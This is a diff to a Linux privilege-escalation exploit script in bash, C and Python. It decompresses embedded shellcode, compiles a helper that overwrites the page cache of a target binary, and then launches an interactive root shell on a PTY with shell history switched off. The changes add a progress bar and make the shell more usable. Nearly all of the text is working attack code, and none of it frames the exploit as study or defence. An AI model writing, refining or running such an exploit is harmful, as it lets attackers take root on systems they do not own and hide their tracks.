@@ -298,21 +298,25 @@ int main(int argc, char *argv[])
   int tfd = open(target_path, O_RDONLY);
   if (tfd < 0) { perror("open(target)"); return 1; }
 
-  printf("[*] Overwriting page cache of %s (%ld bytes)\n", target_path, plen);
+  int bar_width = 20;
+  printf("[*] Overwriting page cache of %s...\n", target_path);
+  fflush(stdout);
   for (int i = 0; i < plen; i += 4) {
     write4(tfd, i, payload + i);
-    if (i % 1000 == 0 && i > 0)
-      printf("[*]   ... %d bytes written\n", i);
+    int done = (i + 4) * bar_width / plen;
+    int pct  = (i + 4) * 100   / plen;
+    printf("\r  [");
+    for (int j = 0; j < done; j++) putchar('#');
+    for (int j = done; j < bar_width; j++) putchar('-');
+    printf("] %5d/%ld (%3d%%)", i + 4, plen, pct);
+    fflush(stdout);
   }
-  printf("[+] Page cache corrupted — spawning shell via %s\n", target_path);
+  printf("\n[+] Done. %ld bytes written to page cache.\n", plen);
+  fflush(stdout);
 
   close(tfd);
   free(payload);
-
-  char *args[] = { (char *)target_path, NULL };
-  execv(target_path, args);
-  perror("execv");
-  return 1;
+  return 0;
 }
 CSRC
 }
@@ -362,14 +366,15 @@ trap 'rm -rf "$WORK"' EXIT
 
 # --- Decompress shellcode ---
 PAYLOAD_BIN="$WORK/payload.bin"
-python3 - "$ZLIB_HEX" "$PAYLOAD_BIN" << 'PYEOF'
+RAW_LEN=$(python3 - "$ZLIB_HEX" "$PAYLOAD_BIN" << 'PYEOF'
 import sys, zlib, binascii
 data = zlib.decompress(binascii.unhexlify(sys.argv[1]))
-# pad to 4-byte boundary
 pad = (4 - len(data) % 4) % 4
 open(sys.argv[2], 'wb').write(data + b'\x00' * pad)
+print(len(data))
 PYEOF
-info "Payload : $(wc -c < "$PAYLOAD_BIN") bytes (decompressed)"
+) || die "Payload decompression failed."
+info "Payload : ${RAW_LEN} bytes"
 
 # --- Compile C helper ---
 C_SRC="$WORK/exploit.c"
@@ -378,5 +383,70 @@ write_c_source "$C_SRC"
 gcc -O2 -o "$C_BIN" "$C_SRC" || die "Compilation failed."
 ok "Compiled inline C helper."
 
-# --- Run ---
-exec "$C_BIN" "$OPT_TARGET" "$PAYLOAD_BIN"
+# --- Run overwrite ---
+"$C_BIN" "$OPT_TARGET" "$PAYLOAD_BIN" || die "Exploit helper failed."
+
+# --- Spawn interactive root shell on PTY ---
+ok "Spawning root shell on fully interactive PTY..."
+ROWS=$(tput lines 2>/dev/null || echo 24)
+COLS=$(tput cols  2>/dev/null || echo 80)
+python3 - "$OPT_TARGET" "$ROWS" "$COLS" << 'PYEOF'
+import pty, os, sys, tty, select, termios, struct, fcntl, time
+
+target = sys.argv[1]
+rows   = int(sys.argv[2])
+cols   = int(sys.argv[3])
+
+master, slave = pty.openpty()
+fcntl.ioctl(master, termios.TIOCSWINSZ, struct.pack('HHHH', rows, cols, 0, 0))
+
+pid = os.fork()
+if pid == 0:
+    os.setsid()
+    fcntl.ioctl(slave, termios.TIOCSCTTY, 0)
+    for fd in (0, 1, 2):
+        os.dup2(slave, fd)
+    os.close(master)
+    os.close(slave)
+    os.execv(target, [target])
+    os._exit(1)
+
+os.close(slave)
+time.sleep(0.3)
+setup = ('bash\n'
+         f' stty rows {rows} cols {cols}\n'
+         ' export TERM=xterm-256color\n'
+         ' export SHELL=/bin/bash\n'
+         ' export HISTFILE=\n'
+         ' stty sane\n'
+         ' [ -f /etc/skel/.bashrc ] && source /etc/skel/.bashrc 2>/dev/null\n'
+         ' [ -f ~/.bashrc ] && source ~/.bashrc 2>/dev/null\n')
+os.write(master, setup.encode())
+
+is_tty = os.isatty(sys.stdin.fileno())
+old = termios.tcgetattr(sys.stdin.fileno()) if is_tty else None
+if is_tty:
+    tty.setraw(sys.stdin.fileno())
+try:
+    while True:
+        r, _, _ = select.select([master, sys.stdin], [], [], 0.05)
+        if master in r:
+            try:
+                data = os.read(master, 4096)
+                sys.stdout.buffer.write(data)
+                sys.stdout.buffer.flush()
+            except OSError:
+                break
+        if sys.stdin in r:
+            data = os.read(sys.stdin.fileno(), 4096)
+            if not data:
+                break
+            os.write(master, data)
+except Exception:
+    pass
+finally:
+    if is_tty and old is not None:
+        termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old)
+    print()
+os.waitpid(pid, 0)
+PYEOF
